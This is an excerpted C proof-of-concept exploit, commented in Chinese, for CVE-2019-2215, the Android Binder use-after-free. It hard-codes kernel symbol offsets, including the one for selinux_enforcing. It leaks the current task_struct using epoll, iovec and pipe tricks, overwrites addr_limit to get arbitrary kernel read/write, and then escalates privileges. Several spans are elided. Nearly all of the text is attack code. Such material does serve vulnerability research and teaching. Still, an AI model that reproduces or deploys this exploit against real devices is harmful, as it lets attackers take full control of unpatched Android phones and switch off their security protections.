/*
 * 使用CVE-2019-2215实现内核任意读写权限的漏洞验证程序 (PoC)
...
// SYMBOL_*为相对地址偏移（基于userdebug版的/proc/kallsyms）
#define SYMBOL__init_user_ns 0x202f2c8
#define SYMBOL__init_task 0x20257d0
#define SYMBOL__init_uts_ns 0x20255c0

#define SYMBOL__selinux_enforcing 0x23ce4a8 // Grant: 使用droidimg+miasm恢复
...
void *dummy_page_4g_aligned;  // 4G对齐的虚拟页
unsigned long current_ptr;    // 当前任务结构体指针
int binder_fd;                // Binder驱动文件描述符

void leak_task_struct(void)
{
  struct epoll_event event = { .events = EPOLLIN };
  if (epoll_ctl(epfd, EPOLL_CTL_ADD, binder_fd, &event)) err(1, "epoll_add 失败");

  struct iovec iovec_array[IOVEC_ARRAY_SZ];
  memset(iovec_array, 0, sizeof(iovec_array));

  /* 构造iovec结构体：
   * 索引IOVEC_INDX_FOR_WQ处：低地址spinlock必须为0
   * 索引IOVEC_INDX_FOR_WQ+1处：用于泄露task_list指针 */
  ...
  int pipefd[2];
  if (pipe(pipefd)) err(1, "pipe 管道创建失败");
  if (fcntl(pipefd[0], F_SETPIPE_SZ, 0x1000) != 0x1000) err(1, "设置 pipe 管道大小失败");
  static char page_buffer[0x1000];
  //if (write(pipefd[1], page_buffer, sizeof(page_buffer)) != sizeof(page_buffer)) err(1, "fill pipe 填充管道数据失败");
  ...
  if (fork_ret == 0){
    ...
    sleep(2);
    printf("[子进程] 执行 EPOLL_CTL_DEL\n");
    epoll_ctl(epfd, EPOLL_CTL_DEL, binder_fd, &event);
    printf("[子进程] EPOLL_CTL_DEL 完成\n");
    // first page: dummy data
    if (read(pipefd[0], page_buffer, sizeof(page_buffer)) != sizeof(page_buffer)) err(1, "管道数据读取失败");
    close(pipefd[1]);
  ...
  if (read(pipefd[0], page_buffer, sizeof(page_buffer)) != sizeof(page_buffer)) err(1, "read full pipe 读取完整管道数据失败");
  // Grant: 如果获取current_ptr有问题，可以取消此注释
  //hexdump_memory((unsigned char *)page_buffer, sizeof(page_buffer));

  printf("父进程: 完成 READV 调用\n");
  int status;
  if (wait(&status) != fork_ret) err(1, "wait 等待子进程失败");
...
void clobber_addr_limit(void)
{
  ...
  int socks[2];
  if (socketpair(AF_UNIX, SOCK_STREAM, 0, socks)) err(1, "socketpair 创建失败");
  if (write(socks[1], "X", 1) != 1) err(1, "write socket dummy byte 失败");
...
void escalate()
{
  ...
  if (pipe(kernel_rw_pipe)) err(1, "kernel_rw_pipe 创建失败");
